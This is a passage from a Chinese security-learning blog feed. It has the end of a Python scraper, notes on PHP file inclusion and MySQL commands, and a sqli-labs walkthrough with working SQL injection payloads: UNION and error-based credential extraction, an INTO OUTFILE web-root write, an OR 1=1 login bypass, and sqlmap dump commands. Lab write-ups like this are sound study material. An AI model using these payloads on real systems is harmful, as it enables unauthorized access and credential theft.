keyword">print</span><span class="token punctuation">(</span>datalist<span class="token punctuation">)</span>    <span class="token keyword">return</span> datalist<span class="token keyword">def</span> <span class="token function">askUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># 模拟浏览器头部信息，向服务器发送消息</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"</span>    <span class="token punctuation">}</span>    request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>head<span class="token punctuation">)</span>    html<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"iso-8859-1"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(html)</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reaseon<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token comment" spellcheck="true">#保存数据</span><span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    book <span class="token operator">=</span> xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    sheet <span class="token operator">=</span> book<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"Date submitted"</span><span class="token punctuation">,</span><span class="token string">"Date published"</span><span class="token punctuation">,</span><span class="token string">"Author"</span><span class="token punctuation">,</span><span class="token string">"Domain"</span><span class="token punctuation">,</span><span class="token string">"Pagerank"</span><span class="token punctuation">,</span><span class="token string">"URL"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">900</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"保存第%d条"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> datalist<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print(data)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    book<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爬取完毕"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2020/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2020/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h1><p>在一个PHP脚本中，去将另外一个文件（PHP）包含进来，去合作完成一件事情。</p><h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><ol><li><p>要么使用被包含文件中的内容，实现代码的共享（重用）：向上包含（索要）</p><blockquote><p>向上包含：在当前脚本要用某个代码之前包含别的文件</p></blockquote></li><li><p>要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含</p><blockquote><p>向下包含：在自己有某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</p></blockquote></li></ol><p><strong>最大的作用</strong>：分工协作：每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情</p><h2 id="文件包含四种形式"><a href="#文件包含四种形式" class="headerlink" title="文件包含四种形式"></a>文件包含四种形式</h2><ol><li><code>include</code>：包含文件</li><li><code>include_once</code>：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</li><li><code>require</code>：与<code>include</code>相同</li><li><code>require_once</code>：与<code>include_once</code>相同</li></ol><p>包含基本语法：</p><p><code>include&#39;文件名字&#39;;</code></p><p><code>include(&#39;文件名字&#39;);    //文件名字：路径问题</code></p><h2 id="文件加载"><a href="#文件加载" class="headerlink" title="文件加载"></a>文件加载</h2><p>PHP代码的执行流程：</p><ol><li>读取代码文件（PHP程序)</li><li>编译：将PHP代码转换成字节码（生成opcode）</li><li>zendengine 来解析opcode，按照字节码去进行逻辑运算</li><li>转换成对应的HTML代码</li></ol><p>文件加载原理：</p><ol><li>在文件加载（<code>include</code>或者<code>require</code>）的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li><li>加载位置：对应的文件中的代码嵌入的位置就是对应的<code>include</code>位置</li><li>在php中被包含的文件是单独进行编译的</li></ol><p><em>PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错</em></p><h2 id="include和require区别"><a href="#include和require区别" class="headerlink" title="include和require区别"></a><code>include</code>和<code>require</code>区别</h2><p><code>include</code>和<code>include_once</code>的区别：</p><p><code>include</code>系统会碰到一次，执行一次；如果对同一个文件进行多次加载，那么系统会执行多次；</p><p><code>include_once</code>系统碰到多次，也只会执行一次</p><p><strong><code>include</code>和<code>require</code>区别</strong>：本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样。前者错误级别比较轻（不会阻止代码执行），后者要求较高，如果包含出错代码不在执行（require后面的代码）</p><h2 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h2><p>文件在加载的时候需要指定文件路径才能保证PHP正确的找到对应的文件</p><p>绝对路径与相对路径区别：</p><ol><li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li><li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li></ol><h2 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h2><p>一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</p><p><em>嵌套包含的时候很容易出现相对路径出错的问题：相对路径会因为文件的包含而改变（./和../）：在win中，每一个文件夹下都有.和..的文件夹</em></p><pre class="line-numbers language-C"><code class="language-C">int main()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql基础命令使用</title>
      <link href="/2020/11/18/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/11/18/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="1-在win下进入mysql"><a href="#1-在win下进入mysql" class="headerlink" title="1. 在win下进入mysql"></a>1. 在win下进入mysql</h3><p><code>mysql -u root -p</code></p><p>再输入密码即可进入（前提是已经安装了mysql并且配置了相关的环境）</p><h3 id="2-语句"><a href="#2-语句" class="headerlink" title="2.语句"></a>2.语句</h3><p>mysql中都以分号；结尾，如果没有输入分号就不会结束语句，可以多行输入后再输入分号结束一条语句</p><h3 id="3-查看所有数据库"><a href="#3-查看所有数据库" class="headerlink" title="3.查看所有数据库"></a>3.查看所有数据库</h3><p><code>show databases;</code></p><h3 id="4-创建数据库"><a href="#4-创建数据库" class="headerlink" title="4. 创建数据库"></a>4. 创建数据库</h3><p><code>create database database_name</code></p><p>如：<code>create database test</code></p><h3 id="4-进入数据库"><a href="#4-进入数据库" class="headerlink" title="4.进入数据库"></a>4.进入数据库</h3><p><code>use database_name</code></p><p>如：<code>use test</code>即可进入数据库test</p><h3 id="5-创建表"><a href="#5-创建表" class="headerlink" title="5. 创建表"></a>5. 创建表</h3><p><code>create table table_name (列名1 属性1，...，列名n 属性n);</code></p><p>如：<code>create table tabletest (name varchar(20),sex char(1),birth date);</code></p><h3 id="6-查看当前数据库的所有表"><a href="#6-查看当前数据库的所有表" class="headerlink" title="6. 查看当前数据库的所有表"></a>6. 查看当前数据库的所有表</h3><p><code>show tables;</code></p><h3 id="7-查看表的结构"><a href="#7-查看表的结构" class="headerlink" title="7. 查看表的结构"></a>7. 查看表的结构</h3><p><code>describe table_name;</code></p><h3 id="8-查看表的所有内容"><a href="#8-查看表的所有内容" class="headerlink" title="8. 查看表的所有内容"></a>8. 查看表的所有内容</h3><p><code>select * from table_name;</code></p><h3 id="9-往表中插入数据"><a href="#9-往表中插入数据" class="headerlink" title="9. 往表中插入数据"></a>9. 往表中插入数据</h3><p><code>insert into table_name (列名1，...，列名k) values(值1，...，值k);</code></p><p>如：<code>insert into tabletest (name,sex,birth) values(&quot;zhangsan&quot;,&quot;m&quot;,20000101);</code></p><p>注意，插入的值如果是字符一定要加双引号</p><h3 id="10-增加列"><a href="#10-增加列" class="headerlink" title="10. 增加列"></a>10. 增加列</h3><p><code>alter table tabletest add column single char(1)</code>;</p><h3 id="11-更新值"><a href="#11-更新值" class="headerlink" title="11. 更新值"></a>11. 更新值</h3><p><code>update tabletest set single=&#39;y&#39; where name=&quot;zhangsan&quot;;</code></p><h3 id="12-删除行"><a href="#12-删除行" class="headerlink" title="12. 删除行"></a>12. 删除行</h3><p><code>delete from tabletest where name=&quot;zhangsan&quot;;</code></p><h3 id="13-删除表"><a href="#13-删除表" class="headerlink" title="13. 删除表"></a>13. 删除表</h3><p><code>drop table table_name;</code></p><h3 id="14-退出"><a href="#14-退出" class="headerlink" title="14. 退出"></a>14. 退出</h3><p><code>quit</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlilabs  --ing</title>
      <link href="/2020/11/09/sqlilabs/"/>
      <url>/2020/11/09/sqlilabs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-–持续更新"><a href="#sqli-labs-–持续更新" class="headerlink" title="sqli-labs    –持续更新"></a>sqli-labs    –持续更新</h1><p>SQL注入漏洞形成的原因是用户输入的数据被SQL解释器执行<br>常见的SQL注入类型包括：数字型和字符型。（还有更详细的划分，但大体上就分为这两个）<br>下面开始以sqli-labs为例，一起学习SQL注入  </p><h2 id="GET基于报错的SQL注入发现"><a href="#GET基于报错的SQL注入发现" class="headerlink" title="GET基于报错的SQL注入发现"></a>GET基于报错的SQL注入发现</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h3><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/1.jpg"><br>题目提示：输入ID，于是构造如下url：  </p><p><code>?id=1</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/2.jpg"><br>为了猜有几个id便慢慢试，到<code>id=15</code>没有回显，故一共有14个id<br>使用单引号注入，报错：<br><img src="https://tremiy.github.io/2020/11/09/sqlilabs/3.jpg"><br>因为报错内容是<code>&#39;1&#39;&#39; LIMIT 0,1</code><br>所以猜测其SQL语句是：<br><code>seclet login_name,password from table where id = &#39;ID&#39; LIMIT 0,1</code><br>所以当我们输入<code>id=1&#39;</code>时1后面的引号会将SQL语句中ID的前一个引号闭合，让SQL语句变为<code>seclet login_name,password from table where id = &#39;1&#39;&#39; LIMIT 0,1</code> ，导致报错。<br>下一步就是利用<code>order by</code>爆出表中列的个数：  </p><p><code>?id=1&#39; order by 3 --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/4.jpg"><br>当<code>order by</code>后面接4列的时候报错，因此可以推测出有3列。<br>下一步，使用<code>union select</code>查看回显的位置  </p><p><code>?id=0&#39; union select 1,2,3 --+</code></p><p><em>这里有个疑问：不知道为什么要选择一个不存在的id才能回显</em></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/5.jpg"><br>发现第2、3列均有回显。<br>接下来需要用到如下函数：<br>（1）<code>version（）</code>：查看数据库版本<br>（2）<code>user（）</code>：查看当前用户<br>（3）<code>database（）</code>：查看使用的数据库<br>（4） <code>limit  </code>:limit子句来分批获取所有数据<br>（5）<code>group_concat（）</code>：一次性获取数据库信息。<br><br><br>有了这些函数就开始爆版本、用户、数据库：  </p><ol><li>查看数据库、版本、用户：<code>?id=0&#39; union select 1,2,group_concat(database(),&#39;,&#39;,version(),&#39;,&#39;,user()) --+</code></li></ol><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/6.jpg">  </p><p>在这里，<code>database()</code>对我们是有用的，因为我们要进入这个数据库查看login_name和password  </p><ol start="2"><li>接着查看表名：<code>?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br><img src="https://tremiy.github.io/2020/11/09/sqlilabs/7.jpg">   </li><li>再接着查看列名： <code>?id=0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() --+</code><br><img src="https://tremiy.github.io/2020/11/09/sqlilabs/8.jpg">  </li><li>最后爆破username和password  ：<code>?id=0&#39; union select 1,2,group_concat(username,password) from users --+</code><br><img src="https://tremiy.github.io/2020/11/09/sqlilabs/9.jpg"></li></ol><h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h3><p>报错语句：<code>&#39;LIMIT 0,1     </code><br>由此猜测其SQL语句：<br><code>select * from table where id=ID LIMIT 0,1</code>  </p><h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3:"></a>less-3:</h3><p>报错语句：<code>&#39;1&#39;&#39;) LIMIT 0,1  </code><br>由此猜测其SQL语句：<br><code>select * from table where id=(&#39;ID&#39;) LIMIT 0,1    </code></p><h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4:"></a>less-4:</h3><p>注入单引号没反应，但注入双引号报错<br>报错语句：<code>&quot;1&quot;&quot;) LIMIT 0,1  </code><br>由此猜测其SQL语句：<br><code>select * from table where id=(&quot;ID&quot;) LIMIT 0,1</code></p><p><strong>剩下的步骤与less-1同</strong></p><p><em>_sqlmap使用指南：<code>https://www.zhihu.com/question/55542962/answer/1195551571</code>    _</em></p><p>这里我也以Less-1为例简单地使用sqlmap吧</p><p>kali自带sqlmap，我也是直接在kali上使用的sqlmap，在使用前先简单介绍一下会用到的一些命令（详细的命令上面给了链接了）</p><p><code>-u + 目标url</code></p><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><code>--dbs</code></td><td>枚举数据库</td></tr><tr><td><code>--tables</code></td><td>枚举数据库的表</td></tr><tr><td><code>--columns</code></td><td>枚举表中的列</td></tr><tr><td><code>-D</code></td><td>指定数据库</td></tr><tr><td><code>-T</code></td><td>指定表</td></tr><tr><td><code>-C</code></td><td>指定列</td></tr></tbody></table><p>接下来开始使用sqlmap：</p><ol><li><code>sqlmap -u http路径/?id=1</code></li></ol><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/10.jpg"></p><ol start="2"><li><code>sqlmap -u http路径/?id=1 --dbs</code></li></ol><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/11.jpg"></p><ol start="3"><li><code>sqlmap -u http路径/?id=1 -D security --tables</code></li></ol><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/12.jpg"></p><ol start="4"><li><p><code>sqlmap -u http路径/?id=1 -D security -T users --columns</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/13.jpg"></p></li><li><p><code>sqlmap -u http路径/?id=1 -D security -T users -C username,password --dump</code></p></li></ol><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/14.jpg"></p><h2 id="GET-基于双注入的SQL注入发现"><a href="#GET-基于双注入的SQL注入发现" class="headerlink" title="GET 基于双注入的SQL注入发现"></a>GET 基于双注入的SQL注入发现</h2><p><strong>有报错，但是没有回显位</strong></p><p>在做题之前，先来了解几个概念：</p><p><strong>SQL中常见的聚合函数：</strong></p><ol><li><p><code>count()</code>：记录个数/项目数/记录数等</p></li><li><p><code>avg()</code>：求某一列的平均数（若有Null会忽略其值，如果需要看成零，则用<code>IsNull()</code>来转换</p></li><li><p><code>sum()</code>：求和</p></li><li><p><code>max()</code>：求最大值</p></li><li><p><code>min()</code>：求最小值  </p><p>关于<code>group by</code>函数和聚合函数的理解可以看看这篇文章：<a href="https://blog.csdn.net/shaofei63/article/details/42800793?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control" target="_blank" rel="noopener"></a></p></li></ol><p>双注入查询需要理解的几个函数：</p><ol><li><p><code>rand()</code>：随机函数</p></li><li><p><code>floor()</code>：取整函数</p></li><li><p><code>count()</code>：汇总函数</p></li><li><p><code>group by</code>：分组语句</p><p>双查询注入原理我觉得<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html" target="_blank" rel="noopener">这篇</a>写的特别好了，但这篇文章评论区问到count()函数为什么是必要的，我不是太理解他的解释。我发现如果没有count()函数，那么返回的结果是这样的：<img src="https://tremiy.github.io/2020/11/09/sqlilabs/16.JPG"></p><p>说明，在第三步将a语句的结果插入到虚拟表中时，即使主键冲突，它也会自动合并，而不会报错，即只有group by时，将a结果插入到虚拟表后会再对比合并。但有了count()函数后，当a在第二次查询时，要再次插入新的a语句结果时，已经为其分配了count值，那么这时合并就会发生错误，因为count本身就是记录不同的key值的，无法合并<img src="https://tremiy.github.io/2020/11/09/sqlilabs/17.JPG"></p><p>以上都是本人的观点，不一定正确，因为没有百度到更具体的原因，在此仅作为个人学习记录。</p></li></ol><h3 id="less-5："><a href="#less-5：" class="headerlink" title="less-5："></a>less-5：</h3><p><em>注意：因为rand()的随机性，如果没有返回报错结果就多执行几次</em></p><ol><li>查询数据库：</li></ol><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/15.JPG"></p><ol start="2"><li>查询表名</li></ol><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/18.JPG"></p><p>这里只能返回一列，因此通过改变<code>Limit 0,1</code>来遍历</p><p><code>limit</code>用法：</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> tableName <span class="token keyword">limit</span> i<span class="token punctuation">,</span>n<span class="token comment" spellcheck="true"># tableName：表名</span><span class="token comment" spellcheck="true"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span><span class="token comment" spellcheck="true"># n：为查询结果返回的数量</span><span class="token comment" spellcheck="true"># i与n之间使用英文逗号","隔开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/19.JPG"></p><ol start="3"><li>查询列名：</li></ol><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 8,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/20.JPG"></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/21.JPG"></p><p>得到username和password</p><ol start="4"><li>最后一个个遍历username和password即可：</li></ol><p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/22.JPG"></p><h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6:"></a>less-6:</h3><p>其他都和less-5一样，但less-6使用双引号闭合字符串</p><h2 id="Dump-into-outfile"><a href="#Dump-into-outfile" class="headerlink" title="Dump into outfile"></a>Dump into outfile</h2><h3 id="less-7："><a href="#less-7：" class="headerlink" title="less-7："></a>less-7：</h3><p>看标题就知道，在做题前需要了解一些函数</p><table><thead><tr><th>函数名</th><th>作用</th><th>用法</th></tr></thead><tbody><tr><td>into outfile()</td><td>写文件</td><td>A into outfile “绝对路径”</td></tr></tbody></table><p>在做实验前要先在<code>my.ini</code>文件中添加<code>secure_file_priv=&quot;&quot;</code>，目的是使得写入文件的路径无限制</p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/29.jpg"></p><p>接下来开始看Less-7：</p><ol><li><p>先猜出闭合字符串的方式：<code>http://localhost/sqli-labs-master/Less-7/?id=1&#39;)) --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/23.JPG"></p></li><li><p>题目提示使用outfile，结合union select 使用，查看数据库名，虽然报错但是仍然生成了一个ttttest.php文件，打开正是数据库名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p><p><em>不知道为什么路径要用”\\“，否则就不能生成文件</em></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/24.JPG"></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/25.JPG"></p></li><li><p>查看表名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p><p><em>注：生成的文件不能覆盖，所以要删除原来的文件再执行</em></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/26.JPG"></p></li><li><p>查看列名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/27.JPG"></p></li><li><p>爆用户名和密码：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(username,password) from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/28.JPG"></p></li></ol><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p><strong>不报错，但是输入出错就不显示<code>Please input the ID as parameter with numeric value </code>这句话，可以利用这一点进行盲注</strong></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h4><p>参考了一点网上的资料写了一个脚本</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h4><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><h4 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h4><p>这个特别简单，利用<code>1=1</code>永远成立即可</p><p>原理与Less-1相同，先利用单引号闭合sql语句，再利用or 1=1语句，让句子永远成立，最后注释后面的语句即可</p><p><em>注意：– 后面是有空格的！</em></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/30.JPG"></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/31.JPG"></p><h4 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h4><p>题目首先提示了，是双引号报错</p><p>那么在username中输入双引号，结果报错：<code>&quot;1&quot;&quot;) and password=(&quot;&quot;) LIMIT 0,1</code>，说明要使用<code>&quot;)</code>闭合</p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/32.JPG"></p><p>成功√</p><h4 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h4><p>题目提示是双注入，我们可以联想到less-5，利用聚合函数和随机数进行报错</p><ol><li><p>找到注入点，输入<code>1&#39;</code>测试，发现返回：<code>&#39;1&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1</code>，于是我们知道是用<code>&#39;)</code>闭合</p></li><li><p>查询列数：</p><p>`1’) order by 1 – ``</p><p> ``1’) order by 2 – `</p><p>1’) order by 3 – `报错，所以可以确定列数是2（一开始想当然以为是3，所以没有做出来，以后还是要细心谨慎呀）</p></li><li><p>利用聚合函数查询数据库：</p><p><code>1&#39;) union select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a #</code></p></li></ol><p><em>注：之前get方法用的注释是<code>--+</code>，实际上是<code>-- </code>（后面有空格），之所以用加号是因为url会进行编码，加号编码后就是空格，而空格编码是%20，但POST方法不是在url中输入，因此使用<code>#</code>或者<code>-- </code>，为了看得更清楚，接下来都用<code>#</code></em></p><p><img src="https://tremiy.github.io/2020/11/09/sqlilabs/33.JPG"></p><ol start="4"><li><p>查询表名：</p><p><code>1&#39;) union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand()*2))as a from information_schema.tables group by a #</code></p></li></ol><p><em>这里和less-5一样更改limit后面的第一个参数就可以得到全部的表名，就不一一列举了</em></p><ol start="5"><li><p>查询列名：</p><p><code>1&#39;) union select count(*),concat((select column_name from information_schema.columns where table_schema=database() limit 1,1),floor(rand()*2))as a from information_schema.tables group by a #</code></p></li><li><p>查询用户名和密码：</p><p><code>1&#39;) union select count(*) ,concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a#</code></p><p><code>1&#39;) union select count(*) ,concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a#</code></p></li></ol><h4 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h4><p>与less-13相同，就是闭合方式不同：使用双引号测试，报错：</p><p><code>&quot;1&quot;&quot; and password=&quot;&quot; LIMIT 0,1</code></p><p>所以只要将less-13的闭合改为双引号，其他都一样，即可完成注入，这里就不再赘述。</p><h4 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 web新手区</title>
      <link href="/2020/11/05/web%E6%96%B0%E6%89%8B/"/>
      <url>/2020/11/05/web%E6%96%B0%E6%89%8B/</url>
      
